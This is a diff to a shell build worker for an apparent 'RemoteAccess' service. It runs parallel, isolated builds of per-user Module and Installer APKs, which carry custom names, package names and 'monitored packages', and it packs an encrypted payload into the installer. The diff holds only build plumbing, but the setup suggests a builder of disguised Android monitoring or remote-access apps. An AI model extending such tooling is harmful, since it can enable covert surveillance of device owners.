@@ -71,15 +71,51 @@ if [ "$WORKER_MODE" -eq 1 ]; then
     : "${BUILD_API_KEY:?BUILD_API_KEY is required in worker mode}"
     BUILD_URL="${BUILD_URL%/}"   # strip trailing /
 
+    # Concurrency cap. Each job runs in its OWN copy of the source tree under
+    # /tmp/ra-job-<JOB_ID>, so jobs cannot clobber each other's strings.xml,
+    # Constants.java, build/ outputs, or apk-output/. Up to MAX_PARALLEL
+    # builds run simultaneously.
+    MAX_PARALLEL="${BUILD_MAX_PARALLEL:-5}"
+    case "$MAX_PARALLEL" in
+        ''|*[!0-9]*) MAX_PARALLEL=5 ;;
+    esac
+    [ "$MAX_PARALLEL" -lt 1 ] && MAX_PARALLEL=1
+
     SELF_SCRIPT="$ROOT_DIR/build.sh"
     LOG_PIPE_DIR="/tmp/ra-worker-$$"
-    mkdir -p "$LOG_PIPE_DIR"
-    trap 'rm -rf "$LOG_PIPE_DIR"' EXIT
+    JOB_ROOT="/tmp/ra-jobs-$$"
+    mkdir -p "$LOG_PIPE_DIR" "$JOB_ROOT"
+
+    # Cleanup handler: kill any in-flight job subshells and remove temp dirs.
+    cleanup_worker() {
+        local pid
+        for pid in $(jobs -p 2>/dev/null); do
+            kill "$pid" 2>/dev/null || true
+        done
+        rm -rf "$LOG_PIPE_DIR" "$JOB_ROOT"
+    }
+    trap cleanup_worker EXIT
 
     echo "==> RemoteAccess build worker starting"
-    echo "    Dashboard: $BUILD_URL"
+    echo "    Dashboard:   $BUILD_URL"
+    echo "    Concurrency: up to $MAX_PARALLEL job(s) in parallel"
+    echo "    Workspace:   $JOB_ROOT (per-job isolation, deleted after each build)"
     echo "    Polling every poll cycle (~25s long-poll). Press Ctrl-C to stop."
     echo ""
+
+    # Wipe any stale APK output from a previous worker process — without this,
+    # if the very first build of a new worker fails, the upload step would
+    # find leftover Module.apk / Installer.apk on disk from the LAST run of
+    # the LAST worker and re-upload them, causing the dashboard to serve an
+    # APK the user never actually requested. Also clears the legacy top-level
+    # debug/release APKs.
+    if [ -d "$ROOT_DIR/apk-output" ]; then
+        find "$ROOT_DIR/apk-output" -mindepth 1 -maxdepth 1 \
+            \( -type d -o -name "*.apk" -o -name "*.apk.idsig" \) \
+            -exec rm -rf {} + 2>/dev/null || true
+        echo "    Cleared apk-output/ (no stale APKs will be served)."
+        echo ""
+    fi
 
     poll_for_job() {
         # Long-poll the backend; backend holds the connection up to ~25s.
@@ -136,7 +172,6 @@ def flush():
 for raw in sys.stdin:
     line = raw.rstrip('\n').rstrip('\r')
     if line:
-        print(line, flush=True)   # also echo locally
         buf.append(line)
     if len(buf) >= 25 or (buf and time.time() - last > 1.0):
         flush(); last = time.time()
@@ -145,9 +180,11 @@ PYEOF
 
     send_logs() {
         # Read newline-delimited log lines from stdin and POST them in
-        # batches to the dashboard. Runs as a per-job pipeline stage.
+        # batches to the dashboard's per-job log endpoint. Local echoing
+        # is handled by `tee` upstream so we don't double-print.
         local job_id="$1"
-        python3 -u "$SEND_LOGS_PY" "$BUILD_URL" "$BUILD_API_KEY" "$job_id"
+        python3 -u "$SEND_LOGS_PY" "$BUILD_URL" "$BUILD_API_KEY" "$job_id" \
+            >/dev/null 2>&1
     }
 
     upload_apk() {
@@ -179,7 +216,174 @@ PYEOF
             "$BUILD_URL/api/build/worker/complete/$job_id" >/dev/null 2>&1 || true
     }
 
+    # Validate access ID format. We only accept "ACC-XXXX-…" (alnum + dash),
+    # 6-64 chars. Anything else is rejected before we even copy the source tree
+    # — that's the "identify user first" gate the dashboard expects.
+    valid_access_id() {
+        local s="$1"
+        [ -n "$s" ] || return 1
+        local len=${#s}
+        [ "$len" -ge 6 ] && [ "$len" -le 64 ] || return 1
+        [[ "$s" =~ ^[A-Za-z0-9_-]+$ ]] || return 1
+        return 0
+    }
+
+    # Provision an isolated copy of the source tree at /tmp/ra-jobs-$$/<JOB_ID>/
+    # so concurrent builds cannot trample each other's per-build mutations
+    # (strings.xml, Constants.java, app/build.access_id, app/build/ outputs,
+    # apk-output/, …). Skips heavy directories that don't need to be copied:
+    #   .git/  .gradle/  app/build/  installer/build/  apk-output/
+    #   node_modules/ react-dashboard/ build_logs/  .agents/
+    provision_workspace() {
+        local job_id="$1"
+        local dst="$JOB_ROOT/$job_id"
+        rm -rf "$dst"
+        mkdir -p "$dst"
+        # cp -a preserves perms, symlinks, timestamps.
+        # Use a tar pipe with --exclude so we get a fast, exclude-aware copy
+        # without depending on rsync (alpine images ship without it).
+        ( cd "$ROOT_DIR" && tar \
+            --exclude=./.git \
+            --exclude=./.gradle \
+            --exclude=./.cache \
+            --exclude=./.local \
+            --exclude=./.agents \
+            --exclude=./node_modules \
+            --exclude=./react-dashboard/node_modules \
+            --exclude=./react-dashboard/dist \
+            --exclude=./app/build \
+            --exclude=./installer/build \
+            --exclude=./apk-output \
+            --exclude=./build_logs \
+            --exclude=./tmp \
+            -cf - . ) | ( cd "$dst" && tar -xf - )
+        mkdir -p "$dst/apk-output"
+    }
+
+    # Run a single job in the background. All output is tagged "[<JOB_ID>] "
+    # so the worker's parent stdout (and the dashboard status server that
+    # consumes it) can attribute interleaved lines from concurrent jobs.
+    run_job() {
+        local JOB_ID="$1"
+        local JOB_ACCESS_ID="$2"
+        local JOB_MODULE_NAME="$3"
+        local JOB_MODULE_PACKAGE="$4"
+        local JOB_INSTALLER_NAME="$5"
+        local JOB_INSTALLER_PACKAGE="$6"
+        local JOB_MONITORED_PACKAGES="$7"
+
+        (
+            # ── Identify user FIRST (before any disk work) ───────────────────
+            echo "🔎 Identifying user for job $JOB_ID …"
+            if ! valid_access_id "$JOB_ACCESS_ID"; then
+                echo "❌ Refusing to build — invalid access id: '$JOB_ACCESS_ID'"
+                complete_job "$JOB_ID" 0 "Invalid access id '$JOB_ACCESS_ID' — must be 6-64 chars [A-Za-z0-9_-]"
+                exit 0
+            fi
+            echo "👤 Verified user: $JOB_ACCESS_ID"
+
+            echo "════════════════════════════════════════════════════════════════"
+            echo "  ▶ Job $JOB_ID — Access $JOB_ACCESS_ID"
+            echo "    Module:    $JOB_MODULE_NAME ($JOB_MODULE_PACKAGE)"
+            echo "    Installer: $JOB_INSTALLER_NAME ($JOB_INSTALLER_PACKAGE)"
+            [ -n "$JOB_MONITORED_PACKAGES" ] && echo "    Monitored: $JOB_MONITORED_PACKAGES"
+            echo "════════════════════════════════════════════════════════════════"
+
+            # ── Provision an isolated workspace ──────────────────────────────
+            echo "📂 Provisioning isolated workspace at $JOB_ROOT/$JOB_ID …"
+            if ! provision_workspace "$JOB_ID"; then
+                echo "❌ Failed to copy source tree into $JOB_ROOT/$JOB_ID"
+                complete_job "$JOB_ID" 0 "Worker failed to provision an isolated workspace"
+                exit 0
+            fi
+            local WORKDIR="$JOB_ROOT/$JOB_ID"
+
+            # ── Run the per-job build ───────────────────────────────────────
+            local JOB_LOG="$LOG_PIPE_DIR/${JOB_ID}.log"
+            : > "$JOB_LOG"
+
+            # IMPORTANT: capture the build's true exit code via PIPESTATUS so
+            # the upload step can refuse to ship stale APKs after a crash.
+            set -o pipefail
+            {
+                BUILD_ACCESS_ID="$JOB_ACCESS_ID" \
+                BUILD_MODULE_NAME="$JOB_MODULE_NAME" \
+                BUILD_MODULE_PACKAGE="$JOB_MODULE_PACKAGE" \
+                BUILD_INSTALLER_NAME="$JOB_INSTALLER_NAME" \
+                BUILD_INSTALLER_PACKAGE="$JOB_INSTALLER_PACKAGE" \
+                BUILD_MONITORED_PACKAGES="$JOB_MONITORED_PACKAGES" \
+                bash "$WORKDIR/build.sh" 2>&1
+                echo "__BUILD_EXIT__=${PIPESTATUS[0]:-$?}"
+            } | tee -a "$JOB_LOG" | send_logs "$JOB_ID"
+            set +o pipefail
+
+            local rc
+            rc="$(grep -oE '__BUILD_EXIT__=[0-9]+' "$JOB_LOG" | tail -1 | cut -d= -f2)"
+            rc="${rc:-1}"
+
+            local OUT_DIR="$WORKDIR/apk-output/$JOB_ACCESS_ID"
+            local MOD_SRC="$OUT_DIR/Module.apk"
+            local INST_SRC="$OUT_DIR/Installer.apk"
+
+            if [ "$rc" != "0" ]; then
+                echo "❌ Job $JOB_ID failed — build exited with code $rc; not uploading any APKs."
+                complete_job "$JOB_ID" 0 "Build failed (exit $rc)"
+            elif [ ! -f "$MOD_SRC" ] || [ ! -f "$INST_SRC" ]; then
+                local missing=""
+                [ ! -f "$MOD_SRC" ]  && missing="${missing}Module.apk "
+                [ ! -f "$INST_SRC" ] && missing="${missing}Installer.apk "
+                echo "❌ Job $JOB_ID failed — missing artefact(s): ${missing}— not uploading."
+                complete_job "$JOB_ID" 0 "Build did not produce: ${missing% }"
+            else
+                # Publish into the worker's apk-output/<accessId>/ for visibility.
+                local PUB_DIR="$ROOT_DIR/apk-output/$JOB_ACCESS_ID"
+                mkdir -p "$PUB_DIR"
+                cp -f "$MOD_SRC"  "$PUB_DIR/Module.apk"
+                cp -f "$INST_SRC" "$PUB_DIR/Installer.apk"
+
+                local MOD_OK=1 INST_OK=1
+                upload_apk "$JOB_ID" module    "$PUB_DIR/Module.apk"    || MOD_OK=0
+                upload_apk "$JOB_ID" installer "$PUB_DIR/Installer.apk" || INST_OK=0
+
+                if [ "$MOD_OK" = 1 ] && [ "$INST_OK" = 1 ]; then
+                    echo "✅ Job $JOB_ID succeeded — both APKs uploaded for $JOB_ACCESS_ID."
+                    complete_job "$JOB_ID" 1 ""
+                else
+                    local err="Upload failed (module=$MOD_OK installer=$INST_OK)"
+                    echo "❌ Job $JOB_ID failed — $err"
+                    complete_job "$JOB_ID" 0 "$err"
+                fi
+            fi
+
+            # ── Always tear down the per-job workspace ──────────────────────
+            rm -rf "$WORKDIR" "$JOB_LOG"
+            echo "🧹 Cleaned workspace for job $JOB_ID"
+        ) 2>&1 | sed -u "s|^|[$JOB_ID] |"
+    }
+
+    # Track in-flight job PIDs so we can cap concurrency. We use `wait -n`
+    # to block until ANY background job finishes, then reap and continue.
+    declare -A JOB_PIDS=()
+    reap_finished_jobs() {
+        local jid pid
+        for jid in "${!JOB_PIDS[@]}"; do
+            pid="${JOB_PIDS[$jid]}"
+            if ! kill -0 "$pid" 2>/dev/null; then
+                wait "$pid" 2>/dev/null || true
+                unset 'JOB_PIDS[$jid]'
+            fi
+        done
+    }
+
     while true; do
+        reap_finished_jobs
+
+        # Block here when the slot pool is full.
+        while [ "${#JOB_PIDS[@]}" -ge "$MAX_PARALLEL" ]; do
+            wait -n 2>/dev/null || true
+            reap_finished_jobs
+        done
+
         resp="$(poll_for_job)"
         if [ -z "$resp" ]; then
             sleep 3
@@ -191,50 +395,17 @@ PYEOF
             continue
         fi
 
-        echo ""
-        echo "════════════════════════════════════════════════════════════════"
-        echo "  ▶ Job $JOB_ID — Access $JOB_ACCESS_ID"
-        echo "    Module:    $JOB_MODULE_NAME ($JOB_MODULE_PACKAGE)"
-        echo "    Installer: $JOB_INSTALLER_NAME ($JOB_INSTALLER_PACKAGE)"
-        [ -n "${JOB_MONITORED_PACKAGES:-}" ] && echo "    Monitored: $JOB_MONITORED_PACKAGES"
-        echo "════════════════════════════════════════════════════════════════"
-
-        # Run build.sh (without --worker) in a subshell, piping all output
-        # to send_logs which streams back to the dashboard. Also tee to a
-        # per-job log file so the worker's local stdout always shows the
-        # full build output (the python receiver uses block-buffered stdin
-        # which can hide live progress otherwise).
-        BUILD_RC=0
-        JOB_LOG="$LOG_PIPE_DIR/${JOB_ID}.log"
-        {
-            BUILD_ACCESS_ID="$JOB_ACCESS_ID" \
-            BUILD_MODULE_NAME="$JOB_MODULE_NAME" \
-            BUILD_MODULE_PACKAGE="$JOB_MODULE_PACKAGE" \
-            BUILD_INSTALLER_NAME="$JOB_INSTALLER_NAME" \
-            BUILD_INSTALLER_PACKAGE="$JOB_INSTALLER_PACKAGE" \
-            BUILD_MONITORED_PACKAGES="$JOB_MONITORED_PACKAGES" \
-            bash "$SELF_SCRIPT" 2>&1
-            echo "BUILD_EXIT=$?"
-        } | tee "$JOB_LOG" | send_logs "$JOB_ID"
-
-        # Recover the build's exit status (tagged in the stream)
-        BUILD_RC=$(grep -oE 'BUILD_EXIT=[0-9]+' "$LOG_PIPE_DIR/.dummy" 2>/dev/null | tail -1 | cut -d= -f2 || true)
-        # The grep above is best-effort; rely on file-presence checks below
-        # for ground truth (an APK either exists or it doesn't).
-
-        OUT_DIR="$ROOT_DIR/apk-output/$JOB_ACCESS_ID"
-        MOD_OK=1; INST_OK=1
-        upload_apk "$JOB_ID" module    "$OUT_DIR/Module.apk"    || MOD_OK=0
-        upload_apk "$JOB_ID" installer "$OUT_DIR/Installer.apk" || INST_OK=0
-
-        if [ "$MOD_OK" -eq 1 ] && [ "$INST_OK" -eq 1 ]; then
-            echo "   ✅ Job $JOB_ID succeeded — both APKs uploaded."
-            complete_job "$JOB_ID" 1 ""
-        else
-            err="Build did not produce both APKs (module=$MOD_OK installer=$INST_OK)"
-            echo "   ❌ Job $JOB_ID failed — $err"
-            complete_job "$JOB_ID" 0 "$err"
-        fi
+        # Spawn the job in the background and track its PID.
+        run_job \
+            "$JOB_ID" \
+            "$JOB_ACCESS_ID" \
+            "$JOB_MODULE_NAME" \
+            "$JOB_MODULE_PACKAGE" \
+            "$JOB_INSTALLER_NAME" \
+            "$JOB_INSTALLER_PACKAGE" \
+            "$JOB_MONITORED_PACKAGES" &
+        JOB_PIDS["$JOB_ID"]=$!
+        echo "📥 Job $JOB_ID accepted for $JOB_ACCESS_ID (slots in use: ${#JOB_PIDS[@]}/$MAX_PARALLEL)"
     done
 fi
 
@@ -384,10 +555,25 @@ PYEOF
 
     # Force clean build whenever customization is active — gradle's resource
     # cache otherwise keeps stale strings/applicationId from a previous build.
+    # ALSO wipe any APK that may already be sitting in apk-output/ so that a
+    # failed/aborted build cannot accidentally re-upload an older artefact
+    # (this used to mask BUILD_EXIT=127 with a "✅ BUILD SUCCESS" because the
+    # worker just uploaded whatever happened to be on disk).
     if [ "$CLEAN_BUILD" -eq 0 ]; then
         echo "  (Customization active — forcing clean build)"
         rm -rf "$ROOT_DIR/app/build" "$ROOT_DIR/installer/build"
     fi
+    rm -f "$ROOT_DIR"/apk-output/*.apk \
+          "$ROOT_DIR"/apk-output/*.apk.idsig 2>/dev/null || true
+    if [ -n "${BUILD_ACCESS_ID:-}" ]; then
+        rm -rf "$ROOT_DIR/apk-output/$BUILD_ACCESS_ID"
+        echo "  Cleared previous APKs for $BUILD_ACCESS_ID"
+    fi
+    # Also wipe the encrypted module asset so the installer is rebuilt around
+    # the new payload, and any leftover signing sidecar files.
+    rm -f "$ROOT_DIR/installer/src/main/assets/module" \
+          "$ROOT_DIR/installer/build.key" \
+          "$ROOT_DIR/installer/payload.pkg" 2>/dev/null || true
 fi
 
 # ── 0. Clean (only when --clean is passed) ───────────────────────────────────
@@ -401,16 +587,61 @@ else
 fi
 
 # ── 1. Java ───────────────────────────────────────────────────────────────────
+# IMPORTANT: never silently fall back to JAVA_HOME="." — that is what produced
+# the infamous "java: command not found" / BUILD_EXIT=127 from a previous
+# version of this script. We resolve Java in the following order, and if NONE
+# of these succeed we abort the build loudly so the worker reports a real error
+# instead of uploading stale APKs from a previous build.
 echo ""
 echo "==> Configuring Java..."
-if [ -d "$ZULU_JDK" ]; then
-    export JAVA_HOME="$ZULU_JDK"
-    echo "  Using Zulu JDK 17 at $JAVA_HOME"
+resolve_java_home() {
+    # 1) Hard-coded Zulu JDK from the Replit nix store, if present.
+    if [ -d "$ZULU_JDK" ] && [ -x "$ZULU_JDK/bin/java" ]; then
+        echo "$ZULU_JDK"; return 0
+    fi
+    # 2) Inherited JAVA_HOME, validated.
+    if [ -n "${JAVA_HOME:-}" ] && [ -x "${JAVA_HOME}/bin/java" ]; then
+        echo "$JAVA_HOME"; return 0
+    fi
+    # 3) `java` already on PATH — reverse the symlink to find JAVA_HOME.
+    if command -v java >/dev/null 2>&1; then
+        local jbin jh
+        jbin="$(readlink -f "$(command -v java)" 2>/dev/null || command -v java)"
+        jh="$(dirname "$(dirname "$jbin")")"
+        if [ -n "$jh" ] && [ -x "$jh/bin/java" ]; then
+            echo "$jh"; return 0
+        fi
+    fi
+    # 4) Common system locations (alpine, debian, fedora, brew, …).
+    local cand
+    for cand in \
+        /usr/lib/jvm/java-17-openjdk \
+        /usr/lib/jvm/java-17-openjdk-amd64 \
+        /usr/lib/jvm/java-17-openjdk-arm64 \
+        /usr/lib/jvm/default-jvm \
+        /usr/lib/jvm/default-java \
+        /opt/java/openjdk \
+        /opt/homebrew/opt/openjdk@17 \
+        /usr/local/opt/openjdk@17; do
+        if [ -x "$cand/bin/java" ]; then
+            echo "$cand"; return 0
+        fi
+    done
+    return 1
+}
+if JAVA_HOME_RESOLVED="$(resolve_java_home)"; then
+    export JAVA_HOME="$JAVA_HOME_RESOLVED"
+    export PATH="$JAVA_HOME/bin:$PATH"
+    echo "  JAVA_HOME = $JAVA_HOME"
 else
-    export JAVA_HOME="$(dirname "$(dirname "$(readlink -f "$(which java)")")")"
-    echo "  Using system Java at $JAVA_HOME"
+    echo "  ERROR: could not locate a usable JDK (need java + javac in \$JAVA_HOME/bin)." >&2
+    echo "         Install OpenJDK 17, e.g.:" >&2
+    echo "           alpine:  apk add openjdk17" >&2
+    echo "           debian:  apt-get install -y openjdk-17-jdk-headless" >&2
+    echo "           macOS:   brew install openjdk@17" >&2
+    echo "         …or set JAVA_HOME to an existing JDK before re-running." >&2
+    exit 127
 fi
-export PATH="$JAVA_HOME/bin:$PATH"
 java -version 2>&1 | sed 's/^/    /'
 
 # ── 2. Android SDK command-line tools ─────────────────────────────────────────
